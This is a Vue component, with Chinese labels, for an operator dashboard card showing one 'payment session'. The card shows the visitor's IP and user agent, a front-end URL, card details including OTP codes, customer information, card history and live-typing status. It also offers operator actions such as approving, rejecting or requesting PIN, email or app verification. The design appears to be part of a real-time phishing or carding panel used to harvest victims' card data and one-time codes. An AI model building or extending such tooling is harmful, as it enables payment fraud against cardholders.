<script setup lang="ts">
import { computed, ref, onMounted, onUnmounted } from 'vue';
import SessionFields from './session-fields.vue';
import SessionTabs from './session-tabs.vue';
import DetailPopup from './detail-popup.vue';
import ActionDropdown from './action-dropdown.vue';

const props = defineProps<{
  session: Api.Payment.PaymentSession;
  pinned?: boolean;
  hideBin?: boolean;
  hidePhone?: boolean;
  hideTabs?: boolean;
  hideAddress?: boolean;
}>();

const emit = defineEmits<{
  (e: 'action', action: Api.Payment.OperatorAction, sessionId: string, message?: string): void;
  (e: 'moveTop', sessionId: string): void;
}>();

const deviceIconInfo = computed(() => {
  const ua = ((props.session as any).ua || '') as string;
  if (/iPhone|iPad|iPod|Mobile|Android/i.test(ua)) return { d: 'M4 10v6m16-6v6M7 9h10v8a1 1 0 0 1-1 1H8a1 1 0 0 1-1-1V9a5 5 0 0 1 10 0M8 3l1 2m7-2l-1 2M9 18v3m6-3v3', fill: 'none', stroke: 'currentColor' };
  if (/Macintosh|Mac OS X/i.test(ua)) return { d: 'M3 4a1 1 0 0 1 1-1h16a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V4zm0 9h18M8 21h8m-6-4l-.5 4m4.5-4l.5 4', fill: 'none', stroke: 'currentColor' };
  return { d: 'M21 13v5c0 1.57-1.248 2.832-2.715 2.923l-.113.003l-.042.018a1 1 0 0 1-.336.056l-.118-.008L13 20.407V13zm-10 0v7.157l-5.3-.662C4.186 19.344 3 18.112 3 16.6V13zm0-9.158V11H3V7.4c0-1.454 1.096-2.648 2.505-2.87zM21 5.9V11h-8V3.591l4.717-.589C19.476 2.857 21 4.191 21 5.9', fill: 'currentColor', stroke: 'none' };
});

// Tick every second for offline timer
const now = ref(Date.now());
let _ticker: ReturnType<typeof setInterval> | null = null;
onMounted(() => { _ticker = setInterval(() => { now.value = Date.now() }, 1000) });
onUnmounted(() => { if (_ticker) clearInterval(_ticker) });

const offlineAgo = computed(() => {
  const offlineAt = (props.session as any).offlineAt as number;
  if (!offlineAt) return '';
  const _now = now.value;
  const diff = Math.floor((_now - offlineAt) / 1000);
  if (diff < 60) return diff + '秒前';
  if (diff < 3600) return Math.floor(diff / 60) + '分钟前';
  return Math.floor(diff / 3600) + '小时前';
});

function handleMoveTop() {
  emit('moveTop', props.session.id);
}

function formatCST(isoStr: string | undefined) {
  if (!isoStr) return '';
  const d = new Date(isoStr);
  const off = d.getTimezoneOffset();
  const cst = new Date(d.getTime() + (off + 480) * 60000);
  return cst.toISOString().replace('T', ' ').slice(0, 19);
}

const statusLabelText = computed(() => {
  const s = props.session.status;
  const hasOtp = !!props.session.cardInfo.otpCode;
  if (s === 'pending') {
    const avp = !!(props.session as any).appVerifyPending;
    if (avp) return '已提交APP验证，待处理';
    const cs = props.session.currentStep || '';
    if (cs === 'pin_verify') return '已提交PIN验证，待处理';
    if (cs === 'email_verify') return '已提交邮箱验证，待处理';
    return hasOtp ? '已提交验证码，待处理' : '已提交卡号，待处理';
  }
  const map: Record<string, string> = { live: '实时输入中', processing: '处理中', completed: '已完成', approved: '已通过', rejected: '已拒绝', cancelled: '已取消' };
  return map[s] || s;
});

const showDetail = ref(false);
const hoveredTab = ref('');
const popupLeft = ref(22);
const popupTop = ref(26);
let hideTimer: ReturnType<typeof setTimeout> | null = null;

function onHoverTab(label: string, evt: MouseEvent) {
  hoveredTab.value = label;
  showDetail.value = true;
  const target = evt.currentTarget as HTMLElement;
  if (target) {
    const rect = target.getBoundingClientRect();
    const parent = target.closest('.tabs-row')?.getBoundingClientRect();
    if (parent) {
      popupLeft.value = rect.left - parent.left;
      popupTop.value = rect.bottom - parent.top + 2;
    }
  }
  if (hideTimer) clearTimeout(hideTimer);
}
function onLeaveTabs() {
  hideTimer = setTimeout(() => { showDetail.value = false; }, 300);
}
function onEnterPopup() {
  if (hideTimer) clearTimeout(hideTimer);
}
function onLeavePopup() {
  showDetail.value = false;
}

const activityText = computed(() => {
  const ts = (props.session as any).lastActivityTs;
  if (!ts) return '';
  const diff = Math.floor((now.value - ts) / 1000);
  if (diff <= 3) return '刚刚';
  if (diff < 60) return diff + '秒前';
  if (diff < 3600) return Math.floor(diff / 60) + '分钟前';
  return Math.floor(diff / 3600) + '小时前';
});

</script>

<template>
  <div class="session-card" :class="{ offline: !session.isOnline }">
    <div class="card-body">
      <div class="header">
        <span class="arrow-btn" :class="{ pinned: pinned }" @click="handleMoveTop" title="置顶">
          <svg width="16" height="16" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 5v14m6-8l-6-6m-6 6l6-6"/></svg>
        </span>
        <span class="order-id">
          <NTooltip trigger="hover" placement="bottom">
            <template #trigger>
              <span style="display:flex;align-items:center">
                编号：{{ session.sessionId }}
                <svg width="18" height="18" viewBox="0 0 24 24" style="vertical-align:-2px;margin-left:2px;margin-right:2px"><path :d="deviceIconInfo.d" :fill="deviceIconInfo.fill" :stroke="deviceIconInfo.stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
              </span>
            </template>
            <div class="order-tip">
              <div>编号: {{ session.sessionId }}</div>
              <div v-if="(session as any).ip">IP: {{ (session as any).ip }}</div>
              <div v-if="(session as any).ua">UA: {{ (session as any).ua }}</div>
              <div>创建: {{ formatCST(session.createdAt) }}</div>
              <div>更新: {{ formatCST(session.updatedAt) }}</div>
            </div>
          </NTooltip>
        </span>
        <span class="activity-timer" v-if="activityText">{{ activityText }}</span>
        <span class="front-url">前台：{{ session.frontendUrl }}</span>
        <span class="status-label" :class="'status-' + session.status">{{ statusLabelText }}</span>
      </div>

      <div class="field-sep"></div>

      <div class="fields-row">
        <div class="fields-wrap">
          <SessionFields :card-info="session.cardInfo" :customer-info="session.customerInfo" :hide-bin="hideBin" :hide-phone="hidePhone" />
        </div>
        <ActionDropdown
          :session-status="session.status"
          :has-otp="!!session.cardInfo.otpCode"
          :app-verify-pending="!!(session as any).appVerifyPending"
          :current-step="session.currentStep || ''"
          @action="(a, m) => emit('action', a, session.id, m)"
        />
      </div>

      <div class="tabs-row" v-if="!hideTabs" @mouseleave="onLeaveTabs">
        <SessionTabs :tabs="session.browsingTabs" :current-step="session.currentStep" @hover-tab="onHoverTab" />
        <DetailPopup
          v-show="showDetail && hoveredTab"
          :style="{ left: popupLeft + 'px', top: popupTop + 'px' }"
          :tab-label="hoveredTab"
          :customer-info="session.customerInfo"
          :card-info="session.cardInfo"
          :card-history="(session as any).cardHistory"
          @mouseenter="onEnterPopup"
          @mouseleave="onLeavePopup"
        />
      </div>
    </div>
  </div>
</template>

<style scoped>
.session-card {
  position: relative;
  background: var(--n-color);
  border: 1px solid var(--n-border-color);
  border-radius: 6px;
  min-height: 104px;
  display: flex;
  align-items: flex-start;
  padding: 8px 8px 0 6px;
  overflow: visible;
  z-index: 1;
  transition: opacity .3s, box-shadow .2s;
  border: 1px solid #3f3e3e40;
  background: rgb(var(--v-theme-surface));
}
.session-card.offline {
  opacity: 0.4;
}
.session-card.offline .detail-popup {
  opacity: 1;
}
.session-card + .session-card {
  margin-top: 8px;
}
html.dark .session-card {
  background: rgb(43, 48, 69);
}
html:not(.dark) .session-card {
  background: #fcfcfc;
}
.session-card:hover {
  z-index: 20;
  box-shadow: 0 2px 8px rgba(0,0,0,.12);
}
.arrow-btn {
  width: 24px; height: 24px;
  padding: 0 3px;
  border: 1px solid rgba(47,43,61,.16);
  border-radius: .25rem;
  display: flex; align-items: center; justify-content: center;
  font-size: 14px; color: var(--n-text-color-3);
  cursor: pointer; flex-shrink: 0; margin-right: 6px;
}
.arrow-btn:hover { color: var(--n-text-color); border-color: var(--n-text-color-3); }
.arrow-btn.pinned { background: #424242; color: #fdfdfd; border-color: #424242; }
html.dark .arrow-btn { border-color: rgba(255,255,255,.16); }
.field-sep {
  border-top: 1px solid var(--n-border-color);
  margin: 6px 0 4px;
}
.fields-row {
  display: flex; align-items: flex-start; gap: 8px;
}
.fields-wrap {
  flex: 1; min-width: 0;
}
.fields-row .action-dropdown {
  flex-shrink: 0; margin-top: 18px; width: 90px;
}
.tabs-row {
  position: relative;
}
.card-body {
  flex: 1;
  min-width: 0;
  position: relative;
}
.header {
  height: 20px;
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 8px;
}
.order-id {
  display: inline-flex;
  align-items: center;
  padding: 0 10px;
  color: #119849;
  background: #d6fbe2;
  border: 1px solid #8cdfaa;
  border-radius: 3px;
  font-weight: bold;
  font-size: 12px;
  white-space: nowrap;
}
.status-dot {
  display: inline-flex;
  align-items: center;
  padding: 0 8px;
  border-radius: 3px;
  font-size: 12px;
  border: 1px solid;
}
.status-dot.online {
  color: #18d46b;
  background: #18d46b10;
  border-color: #18d46b33;
}
.status-dot.offline {
  color: var(--n-text-color-3);
  opacity: .6;
}
.countdown {
  display: inline-flex;
  align-items: center;
  padding: 0 8px;
  border-radius: 3px;
  font-weight: bold;
  font-size: 12px;
  color: var(--n-text-color);
  background: rgba(128,128,128,.1);
  border: 1px solid var(--n-border-color);
}
html.dark .countdown { background: rgba(255,255,255,.06); }
.countdown.warning {
  color: #f0a12d;
}
.countdown.urgent {
  color: #ff5d70;
  animation: blink 1s infinite;
}
.countdown.expired {
  color: #fff;
  background: #ff5d70;
  border-color: #ff5d70;
  animation: pulse-bg 2s infinite;
}
@keyframes blink {
  50% { opacity: .4; }
}
@keyframes pulse-bg {
  0%, 100% { background: #ff5d70; }
  50% { background: #c0392b; }
}
.front-url {
  color: var(--n-text-color-3);
  font-size: 12px;
  border: 1px solid rgba(47, 43, 61, 0.16);
  padding: 0 10px;
  border-radius: 3px;
}
html.dark .front-url { background: #ffffff00; border: 1px solid rgba(208, 212, 241, 0.16); }
html.dark .action-dropdown .n-button--info-type { --n-text-color: #fff; --n-text-color-hover: #fff; --n-text-color-pressed: #fff; --n-text-color-focus: #fff; --n-text-color-disabled: #fff; }
.offline .order-id {
  border-color: #909399;
  background-color: #909399;
  color: #fff;
}
.status-label { font-size: 13px; padding: 1px 6px; border-radius: 3px; white-space: nowrap; flex-shrink: 0; margin-left: auto; }
.status-label.status-live { color: #18d46b; background: #18d46b10; }
.status-label.status-pending { color: #f0412d; background: #f0a12d10; }
.status-label.status-processing { color: #7968ed; background: #7968ed10; }
.status-label.status-completed { color: #30a0e0; background: #30a0e010; }
.status-label.status-approved { color: #18d46b; background: #18d46b10; }
.activity-timer {
  font-size: 12px; color: var(--n-text-color-3); border: 1px solid rgba(47, 43, 61, 0.16); border-radius: 3px; padding: 0 10px; white-space: nowrap;
}
html.dark .activity-timer { border-color: rgba(208, 212, 241, 0.16); background: #ffffff00; }
.order-tip { font-size: 12px; line-height: 1.6; }
.order-tip div { white-space: nowrap; }
.status-label.status-rejected { color: #ff5d70; background: #ff5d7010; }
</style>
